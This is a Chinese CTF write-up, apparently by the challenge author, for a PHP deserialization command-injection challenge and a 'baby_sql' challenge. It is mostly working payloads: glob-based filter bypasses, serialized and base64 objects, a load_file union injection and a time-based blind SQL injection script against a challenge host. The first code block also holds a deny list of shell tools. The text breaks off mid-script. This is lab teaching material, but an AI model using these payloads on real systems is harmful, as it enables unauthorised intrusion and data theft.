<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|;|date|bash|\$|\x00|`|env|\?|wget|\&quot;|\&#x27;|\\\|php|id|whoami|=/i&#x27;</span>, <span class="variable">$this</span>-&gt;payload)) &#123; </span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;payload.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fuck you Hacker&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		没有过滤空格，还算好（主要是因为这里不知道为啥我用一些手法绕不过空格，我就没有管了，毕竟 $ 没了，多个重定向符也有问题，过不了 /dev/null），寻常的 ls，dir 都被过滤了，大小于符号和中括号没有过，通配符过滤了，反斜杠也过滤了，那就用中括号和文件名来绕过吧，先来一波：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//payload:/bin/l[s] ||</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;User&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:12:&quot;/bin/l[s] ||&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Tzo0OiJVc2VyIjo2OntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6NjoicGFzc3dkIjtzOjY6IjEyMzQ1NiI7czo1OiJ0b2tlbiI7czo1OiJhZG1pbiI7czozOiJtc2ciO086NzoiY2xhc3MwMSI6Mzp7czo0OiJ0ZW1wIjtpOjA7czo0OiJzdHIzIjtPOjc6ImNsYXNzMDIiOjE6e3M6NzoicGF5bG9hZCI7czoxMjoiL2Jpbi9sW3NdIHx8Ijt9czozOiJjbHMiO086NzoiY2xhc3MwMCI6MDp7fX19</span></span><br></pre></td></tr></table></figure>
<p>​		成功打出组合拳，这里存在一个无回显的一个绕过，需要用 || 来绕过 <code>&gt;/dev/null 2&gt;&amp;1</code> ，原理就是让这一串单独执行或者不执行即可。</p>
<p>​		之后就是读取 flag 了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///bin/ca[t] /fla[g] ||</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;User&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:21:&quot;/bin/ca[t] /fla[g] ||&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Tzo0OiJVc2VyIjo2OntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6NjoicGFzc3dkIjtzOjY6IjEyMzQ1NiI7czo1OiJ0b2tlbiI7czo1OiJhZG1pbiI7czozOiJtc2ciO086NzoiY2xhc3MwMSI6Mzp7czo0OiJ0ZW1wIjtpOjA7czo0OiJzdHIzIjtPOjc6ImNsYXNzMDIiOjE6e3M6NzoicGF5bG9hZCI7czoyMToiL2Jpbi9jYVt0XSAvZmxhW2ddIHx8Ijt9czozOiJjbHMiO086NzoiY2xhc3MwMCI6MDp7fX19Cg==</span></span><br></pre></td></tr></table></figure>
<p>​		之后读取源码找到了 flag</p>
<h3 id="baby_sql"><a class="markdownIt-Anchor" href="#baby_sql">#</a> baby_sql：</h3>
<h4 id="非预期"><a class="markdownIt-Anchor" href="#非预期">#</a> 非预期：</h4>
<p>​		index 页面的 password 存在 sql 注入，本来想出弱密码的，结果没注意到这里也能打注入，被 sqlmap 一把梭了。</p>
<p>​		首先万能密码登陆之后，用 group by 确定字段数，接着这里 可以用 loadfile 来快速出 flag。当然，这是建立在 flag 的文件 确实在根目录并且名字确实是 flag，而且存在其他限制，成 功逃课的可能性并不是很大，这里因为同时存在两个原因导致了非预期，一是因为题目部署到平台的时候有个参数忘记删了，这个参数导致了 flag 会被写入 /flag，另外，题目测试的时候，var_dump 我忘记删了，会把信息给一同打印出来，就导致了这个题有回显，我的锅啊。</p>
<p><code>payload：-1'/**/union/**/select/**/1,1,load_file('/flag')#</code></p>
<h4 id="预期解"><a class="markdownIt-Anchor" href="#预期解">#</a> 预期解</h4>
<p>​		首先，index 是一个登陆框，排除弱密码的可能，别问为什么，因为爆不出来，直接考虑万能密码，根据密码是存在字符和字母数字的，所以预测为字符型，直接 <code>1' or 1=1#</code> 即可</p>
<p>​		第二页有个莫名其妙的报错，不管。</p>
<p>​		拿到这个题的第一时间 fuzz 一下过滤，先做几个尝试，首先，我没捣鼓过这个题能否做布尔盲注，所以直接上时间盲注的手法。随便写入一些，触发过滤，发现有异常输出，也就是 NO,Hacker，好了，可以跑字典了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> post</span><br><span class="line"></span><br><span class="line">lst = [<span class="string">&quot;select&quot;</span>,</span><br><span class="line"><span class="string">&quot;update&quot;</span>,</span><br><span class="line"><span class="string">&quot;from&quot;</span>,</span><br><span class="line"><span class="string">&quot;where&quot;</span>,</span><br><span class="line"><span class="string">&quot;union&quot;</span>,</span><br><span class="line"><span class="string">&quot;like&quot;</span>,</span><br><span class="line"><span class="string">&quot;and&quot;</span>,</span><br><span class="line"><span class="string">&quot;delete&quot;</span>,</span><br><span class="line"><span class="string">&quot;drop&quot;</span>,</span><br><span class="line"><span class="string">&quot;insert&quot;</span>,</span><br><span class="line"><span class="string">&quot;join&quot;</span>,</span><br><span class="line"><span class="string">&quot;hex&quot;</span>,</span><br><span class="line"><span class="string">&quot;or&quot;</span>,</span><br><span class="line"><span class="string">&quot;if&quot;</span>,</span><br><span class="line"><span class="string">&quot;xor&quot;</span>,</span><br><span class="line"><span class="string">&quot;not&quot;</span>,</span><br><span class="line"><span class="string">&quot;table_name&quot;</span>,</span><br><span class="line"><span class="string">&quot;CHAR&quot;</span>,</span><br><span class="line"><span class="string">&quot;group_concat&quot;</span>,</span><br><span class="line"><span class="string">&quot;information&quot;</span>,</span><br><span class="line"><span class="string">&quot;schema&quot;</span>,</span><br><span class="line"><span class="string">&quot;columns&quot;</span>,</span><br><span class="line"><span class="string">&quot;regexp&quot;</span>,</span><br><span class="line"><span class="string">&quot;greatest&quot;</span>,</span><br><span class="line"><span class="string">&quot;ascii&quot;</span>,</span><br><span class="line"><span class="string">&quot;substr&quot;</span>,</span><br><span class="line"><span class="string">&quot;strcmp&quot;</span>,</span><br><span class="line"><span class="string">&quot;in&quot;</span>,</span><br><span class="line"><span class="string">&quot;between&quot;</span>,</span><br><span class="line"><span class="string">&quot;database&quot;</span>,</span><br><span class="line"><span class="string">&quot;offset&quot;</span>,</span><br><span class="line"><span class="string">&quot;limit&quot;</span>,</span><br><span class="line"><span class="string">&quot;sleep&quot;</span>,</span><br><span class="line"><span class="string">&quot;benchmark&quot;</span>,</span><br><span class="line"><span class="string">&quot;bin&quot;</span>,</span><br><span class="line"><span class="string">&quot;mid&quot;</span>,</span><br><span class="line"><span class="string">&quot;substring&quot;</span>,</span><br><span class="line"><span class="string">&quot;updatexml&quot;</span>,</span><br><span class="line"><span class="string">&quot; &quot;</span>,</span><br><span class="line"><span class="string">&quot;--&quot;</span>,</span><br><span class="line"><span class="string">&quot;\&#x27;&quot;</span>,</span><br><span class="line"><span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line"><span class="string">&quot;()&quot;</span>,</span><br><span class="line"><span class="string">&quot;-&quot;</span>,</span><br><span class="line"><span class="string">&quot;+&quot;</span>,</span><br><span class="line"><span class="string">&quot;#&quot;</span>,</span><br><span class="line"><span class="string">&quot;*&quot;</span>,</span><br><span class="line"><span class="string">&quot;/&quot;</span>,</span><br><span class="line"><span class="string">&quot;!&quot;</span>,</span><br><span class="line"><span class="string">&quot;,&quot;</span>,</span><br><span class="line"><span class="string">&quot;`&quot;</span>,</span><br><span class="line"><span class="string">&quot;&amp;&quot;</span>,</span><br><span class="line"><span class="string">&quot;|&quot;</span>,</span><br><span class="line"><span class="string">&quot;;&quot;</span>,</span><br><span class="line"><span class="string">&quot;^&quot;</span>,</span><br><span class="line"><span class="string">&quot;%&quot;</span>,</span><br><span class="line"><span class="string">&quot;@&quot;</span>,</span><br><span class="line"><span class="string">&quot;=&quot;</span>,</span><br><span class="line"><span class="string">&quot;&lt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;&quot;</span>]</span><br><span class="line"></span><br><span class="line">temp = <span class="string">&quot;NO,Hacker&quot;</span></span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1/worker.php&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>:i&#125;</span><br><span class="line">    rsp = post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> temp <span class="keyword">in</span> rsp.text:</span><br><span class="line">        a.append(i)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[&#x27;update&#x27;, &#x27;delete&#x27;, &#x27;drop&#x27;, &#x27;insert&#x27;, &#x27;join&#x27;, &#x27;hex&#x27;, &#x27;CHAR&#x27;, &#x27;information&#x27;, &#x27;updatexml&#x27;, &#x27; &#x27;, &#x27;--&#x27;, &#x27;=&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;]</span></span><br></pre></td></tr></table></figure>
<p>​		最后跑出来和我预计的差不多，然后因为又是可以输入字符等等，推测还是字符型注入，随机构造一下 payload 看看能否成功：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> post</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://154.64.254.169:33161/worker.php&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;111&#x27;/**/or/**/if((select/**/database())/**/like/**/database(),sleep(5),sleep(0))#&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;name&quot;</span>:payload&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">istime</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = post(url,data=data,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;timeout&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(istime(data))</span><br><span class="line"></span><br><span class="line"><span class="comment">#timeout</span></span><br></pre></td></tr></table></figure>
<p>​		可以盲注，因为过滤了 infomation，所以需要用 innodb 来绕过，先跑，直接梭哈（脚本每次的时间会很长，这个是为了保证正确率，因为远程测试的时候出现了服务器扛不住的情况，所以，需要增加等待时长来防止服务器宕机）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#测试的时候服务器有点问题，爆破的时候总是要出问题，建议每一个函数多跑几次保证成功率，或者每次多修改一些time和sleep的时长保证正确率</span></span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> post</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">alpha = <span class="string">&quot;&quot;&quot;&#123;_&#125;[]-&quot;&quot;&quot;</span> + string.ascii_letters + string.digits</span><br><span class="line">url = <span class="string">&quot;http://154.64.254.169:33113/worker.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">istime</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = post(url,data=data,timeout=<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库长度为：7</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name_len</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/or/**/if((select/**/length(database()))/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>:payload&#125;</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;数据库长度为：%d&quot;</span>%i)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#数据库名为greatsql</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name</span>():</span><br><span class="line">    name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> alpha:</span><br><span class="line">            payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if(substr(database(),&#123;&#125;,1)/**/like/**/&#x27;&#123;&#125;&#x27;,sLeep(20),sLeep(0))#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">                name += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据库的名字是&quot;</span>+name)</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库的个数为4</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name_count</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((seLect/**/COUNT(database_name)/**/fRom/**/mysql.innodb_table_stats)/**/like/**/&#123;&#125;,sLeep(20),sLeep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;数据库的个数为&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># [10, 5, 5, 7]</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name_len_list</span>():</span><br><span class="line">    name_len_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">            payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((select/**/length(database_name)/**/from/**/mysql.innodb_table_stats/**/limit/**/&#123;&#125;,1)/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">                name_len_list.append(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(name_len_list)</span><br><span class="line">    <span class="keyword">return</span> name_len_list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上一个查询结果为四次，所以手动查四次，没跑完一次，修改limit后面的参数，以及第一层for循环的参数</span></span><br><span class="line"><span class="comment"># flag1shere</span></span><br><span class="line"><span class="comment"># mysql</span></span><br><span class="line"><span class="comment"># users</span></span><br><span class="line"><span class="comment"># workers</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name_list</span>():</span><br><span class="line">    name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> alpha:</span><br><span class="line">            payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((select/**/substr(database_name,&#123;&#125;,1)/**/from/**/mysql.innodb_table_stats/**/limit/**/3,1)/**/like/**/&#x27;&#123;&#125;&#x27;,sLeep(20),sLeep(0))#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">                name += j</span><br><span class="line">                time.sleep(<span class="number">2</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前数据库的表有2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tb_count</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((select/**/count(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#x27;flag1shere&#x27;)/**/like/**/&#123;&#125;,sleep(20),sLeep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;当前数据库的表有&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 因为测出来有两个表，所以需要查两次</span></span><br><span class="line"><span class="comment"># 当前数据库表名长度为36</span></span><br><span class="line"><span class="comment"># 当前数据库表名长度为8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tb_name_len</span>():</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((select/**/length(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#x27;flag1shere&#x27;/**/limit/**/0,1)/**/like/**/&#123;&#125;,sleep(20),sLeep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;当前数据库表名长度为&quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 因为存在两张表，所以得查两次</span></span><br><span class="line"><span class="comment"># flag_is_in_flag1shere_loockhere_flag</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tb_name</span>():</span><br><span class="line">    name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">37</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> alpha:</span><br><span class="line">            payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((select/**/substr(table_name,&#123;&#125;,1)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#x27;flag1shere&#x27;/**/limit/**/0,1)/**/in/**/(&#x27;&#123;&#125;&#x27;),sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(j,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                name += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span 